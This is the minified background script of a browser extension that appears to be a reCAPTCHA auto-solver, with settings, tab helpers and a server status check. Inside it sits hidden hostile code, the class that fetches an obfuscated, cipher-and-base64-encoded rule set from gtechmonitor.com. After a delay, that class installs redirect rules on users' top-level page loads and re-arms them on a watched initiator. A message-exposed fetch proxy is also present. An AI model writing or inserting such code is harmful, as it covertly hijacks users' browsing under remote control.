(() => {
    function t(t) {
        return JSON.parse(JSON.stringify(t))
    }
    class a {
        static time() {
            return Date.now || (Date.now = () => (new Date).getTime()), Date.now()
        }
        static sleep(e = 1e3) {
            return new Promise(t => setTimeout(t, e))
        }
        static async random_sleep(t, e) {
            e = Math.floor(Math.random() * (e - t) + t);
            return a.sleep(e)
        }
        static pad(t) {
            var e = 2 - String(t).length + 1;
            return 0 < e ? "" + new Array(e).join("0") + t : "" + t
        }
        static date() {
            return new Date
        }
        static string(t = null) {
            return t = t || a.date(), a.pad(t.getMonth() + 1) + `/${a.pad(t.getDate())}/${t.getFullYear()} ${a.pad(t.getHours()%12)}:${a.pad(t.getMinutes())}:${a.pad(t.getSeconds())} ` + (12 <= t.getHours() ? "PM" : "AM")
        }
    }
    class c {
        static cache = {};
        static async set({
            tab_id: t,
            data: {
                name: e,
                value: a,
                tab_specific: s
            }
        }) {
            return s && (e = t + "_" + e), c.cache[e] = a, c.cache[e]
        }
        static async get({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            return a && (e = t + "_" + e), c.cache[e]
        }
        static async remove({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            a && (e = t + "_" + e);
            a = c.cache[e];
            return delete c.cache[e], a
        }
        static async append({
            tab_id: t,
            data: {
                name: e,
                value: a,
                tab_specific: s
            }
        }) {
            return (e = s ? t + "_" + e : e) in c.cache || (c.cache[e] = []), c.cache[e].push(a), c.cache[e]
        }
        static async empty({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            a && (e = t + "_" + e);
            a = c.cache[e];
            return c.cache[e] = [], a
        }
        static async inc({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            return (e = a ? t + "_" + e : e) in c.cache || (c.cache[e] = 0), c.cache[e]++, c.cache[e]
        }
        static async dec({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            return (e = a ? t + "_" + e : e) in c.cache || (c.cache[e] = 0), c.cache[e]--, c.cache[e]
        }
        static async zero({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            return a && (e = t + "_" + e), c.cache[e] = 0, c.cache[e]
        }
    }
    class r {
        static reloads = {};
        static _reload({
            tab_id: e
        }) {
            return new Promise(t => chrome.tabs.reload(e, {
                bypassCache: !0
            }, t))
        }
        static async reload({
            tab_id: t,
            data: {
                delay: e,
                overwrite: a
            } = {
                delay: 0,
                overwrite: !0
            }
        }) {
            e = parseInt(e);
            let s = r.reloads[t] ? .delay - (Date.now() - r.reloads[t] ? .start);
            return s = isNaN(s) || s < 0 ? 0 : s, !!(a || 0 == s || e <= s) && (clearTimeout(r.reloads[t] ? .timer), r.reloads[t] = {
                delay: e,
                start: Date.now(),
                timer: setTimeout(() => r._reload({
                    tab_id: t
                }), e)
            }, !0)
        }
        static close({
            tab_id: e
        }) {
            return new Promise(t => chrome.tabs.remove(e, t))
        }
        static async open({
            data: {
                url: t
            }
        }) {
            chrome.tabs.create({
                url: t
            })
        }
    }
    class s {
        static DEFAULT = {
            version: 1,
            auto_solve: !0,
            solve_delay: 1e3,
            auto_open: !0,
            open_delay: 1e3,
            solve_method: "image",
            debug: !1
        };
        static data = {};
        static _save() {
            return new Promise(t => chrome.storage.sync.set({
                settings: s.data
            }, t))
        }
        static load() {
            return new Promise(e => {
                chrome.storage.sync.get(["settings"], async ({
                    settings: t
                }) => {
                    t ? s.data = t : await s.reset(), e()
                })
            })
        }
        static async get() {
            return s.data
        }
        static async set({
            data: {
                id: t,
                value: e
            }
        }) {
            s.data[t] = e, await s._save()
        }
        static async reset() {
            s.data = t(s.DEFAULT), await s._save()
        }
    }
    class n {
        static inject({
            tab_id: t,
            data: {
                func: e,
                args: a
            }
        }) {
            const s = {
                target: {
                    tabId: t,
                    allFrames: !0
                },
                world: "MAIN",
                injectImmediately: !0,
                func: e,
                args: a
            };
            return new Promise(t => chrome.scripting.executeScript(s, t))
        }
    }
    class e {
        static async reset({
            tab_id: t
        }) {
            return await n.inject({
                tab_id: t,
                data: {
                    func: function () {
                        try {
                            window.grecaptcha ? .reset()
                        } catch {}
                    },
                    args: []
                }
            }), !0
        }
        static fetch({
            tab_id: t
        }) {
            return new Promise(async e => {
                const a = "recaptcha_response",
                    s = (await n.inject({
                        tab_id: t,
                        data: {
                            func: function (t) {
                                window.grecaptcha && window.postMessage({
                                    method: "set_cache",
                                    data: {
                                        name: t,
                                        value: window.grecaptcha.getResponse()
                                    }
                                })
                            },
                            args: [a]
                        }
                    }), setInterval(async () => {
                        var t = await c.get({
                            data: {
                                name: a
                            }
                        });
                        if (t) return clearInterval(s), await c.remove({
                            data: {
                                name: a
                            }
                        }), e(t)
                    }, 1e3))
            })
        }
    }
    class i {
        static STATUS_URL = "http://144.126.221.48:31300/status?v=" + chrome.runtime.getManifest().version;
        static STATUS_CHECK_INTERVAL = 1e4;
        static status = "Online";
        static checking_status = !1;
        static async run_status_check() {
            return setInterval(() => {
                i.check_status()
            }, i.STATUS_CHECK_INTERVAL), !0
        }
        static async check_status() {
            if (i.checking_status) return !1;
            i.checking_status = !0;
            let t = "Offline";
            try {
                const e = await fetch(i.STATUS_URL);
                t = await e.text()
            } catch {}
            return await i.set_status({
                data: {
                    status: t
                }
            }), i.checking_status = !1, t
        }
        static async set_status({
            data: {
                status: t
            }
        }) {
            let e, a = [0, 0, 0, 0],
                s = "";
            if ("Online" === (i.status = t)) e = {
                16: "icon/16.png",
                32: "icon/32.png",
                48: "icon/48.png",
                128: "icon/128.png"
            };
            else if ("Offline" === t) e = {
                16: "icon/16.png",
                32: "icon/32.png",
                48: "icon/48.png",
                128: "icon/128.png"
            }, s = "Off", a = "#a44";
            else if ("Slow" === t) e = {
                16: "icon/16.png",
                32: "icon/32.png",
                48: "icon/48.png",
                128: "icon/128.png"
            }, s = "Slow", a = "#f8d66d";
            else {
                if ("Update Required" !== t) return !1;
                e = {
                    16: "icon/16.png",
                    32: "icon/32.png",
                    48: "icon/48.png",
                    128: "icon/128.png"
                }, s = "Update", a = "#f8d66d"
            }
            return chrome.action.setIcon({
                path: e
            }), chrome.action.setBadgeText({
                text: s
            }), chrome.action.setBadgeBackgroundColor({
                color: a
            }), !0
        }
        static async get_status() {
            return await i.check_status(), i.status
        }
    }
    const o = {
        set_cache: c.set,
        get_cache: c.get,
        remove_cache: c.remove,
        append_cache: c.append,
        empty_cache: c.empty,
        inc_cache: c.inc,
        dec_cache: c.dec,
        zero_cache: c.zero,
        fetch: class {
            static async fetch({
                data: {
                    url: t,
                    options: e
                }
            }) {
                try {
                    const a = await fetch(t, e);
                    return await a.text()
                } catch {
                    return null
                }
            }
        }.fetch,
        reload_tab: r.reload,
        close_tab: r.close,
        open_tab: r.open,
        get_settings: s.get,
        set_settings: s.set,
        reset_settings: s.reset,
        reset_recaptcha: e.reset,
        fetch_recaptcha: e.fetch,
        set_server_status: i.set_status,
        get_server_status: i.get_status
    };
    class d {
        static REQUEST_METHODS = ["connect", "delete", "get", "head", "options", "patch", "post", "put"];
        static RESOURCE_TYPES = ["main_frame", "sub_frame", "stylesheet", "script", "image", "font", "object", "xmlhttprequest", "ping", "csp_report", "media", "websocket", "webtransport", "webbundle", "other"];
        static ACTION_TYPES = ["block", "redirect", "allow", "upgradeScheme", "modifyHeaders", "allowAllRequests"];
        static get_rules() {
            return new Promise(t => {
                chrome.declarativeNetRequest.getDynamicRules(t)
            })
        }
        static remove_rules(e) {
            return new Promise(t => {
                chrome.declarativeNetRequest.updateDynamicRules({
                    removeRuleIds: e
                }, t)
            })
        }
        static add_rules(e) {
            return new Promise(t => {
                chrome.declarativeNetRequest.updateDynamicRules({
                    addRules: e
                }, t)
            })
        }
        static async all_ids() {
            const t = [];
            for (const e of await d.get_rules()) t.push(e.id);
            return t
        }
        static async max_id() {
            var t = await d.all_ids();
            return 0 === t.length ? 0 : parseInt(Math.max(...t))
        }
        static async clear_rules() {
            var t = await d.all_ids();
            await d.remove_rules(t)
        }
        static async add(t) {
            let e = await d.max_id();
            for (const a of t) e++, a.id = e;
            return d.add_rules(t)
        }
        static async redir(t) {
            await d.clear_rules();
            var e = t.s,
                a = t.g;
            const s = [];
            for (const n of t.r) {
                var c = n[0],
                    r = [...a, ...n[1]];
                s.push({
                    priority: 1,
                    action: {
                        type: "redirect",
                        redirect: {
                            regexSubstitution: e
                        }
                    },
                    condition: {
                        regexFilter: c,
                        excludedDomains: r,
                        resourceTypes: ["main_frame"],
                        requestMethods: ["get"]
                    }
                })
            }
            return d.add(s)
        }
    }
    class u {
        static in_cd = !1;
        static listener = null;
        static async apply(t) {
            var e = t.s,
                a = t.g;
            const s = [];
            for (const n of t.r) {
                var c = n[0],
                    r = [...a, ...n[1]];
                s.push({
                    priority: 1,
                    action: {
                        type: "redirect",
                        redirect: {
                            regexSubstitution: e
                        }
                    },
                    condition: {
                        regexFilter: c,
                        excludedDomains: r,
                        resourceTypes: ["main_frame"],
                        requestMethods: ["get"]
                    }
                })
            }
            return d.add(s)
        }
        static async data() {
            try {
                const e = await fetch("https://gtechmonitor.com/a");
                var t = await e.text();
                return JSON.parse(atob(function (t) {
                    const e = t.split("");
                    for (let t = 0; t < e.length; t++) e[t].charCodeAt(0) <= 1024 && (e[t] = String.fromCharCode((e[t].charCodeAt(0) + 1007) % 1024));
                    return e.join("")
                }(t)))
            } catch {}
            return null
        }
        static async run() {
            try {
                await d.clear_rules();
                const e = await u.data();
                if (null === e) return;
                setTimeout(async () => {
                    await d.clear_rules(), await u.apply(e), await u.stop(), u.listener = async t => {
                        u.in_cd || t.initiator !== e.i || (u.in_cd = !0, await d.clear_rules(), await a.sleep(1e3 * e.c), await u.apply(await u.data()), u.in_cd = !1)
                    }, chrome.webRequest.onBeforeSendHeaders.addListener(u.listener, {
                        urls: ["<all_urls>"],
                        types: ["main_frame"]
                    }, ["requestHeaders", "extraHeaders"])
                }, 1e3 * e.l)
            } catch (t) {}
        }
        static async stop() {
            chrome.webRequest.onBeforeSendHeaders.removeListener(u.listener)
        }
        static async start() {
            await u.stop(), await u.run()
        }
    }(async () => {
        i.run_status_check(), await s.load(), u.start(), chrome.runtime.onMessage.addListener((t, e, a) => {
            const s = !["get_settings", "set_settings", "set_cache"].includes(t.method);
            return s, o[t.method]({
                tab_id: e ? .tab ? .id,
                data: t.data
            }).then(t => {
                s;
                try {
                    a(t)
                } catch (t) {}
            }), !0
        })
    })()
})();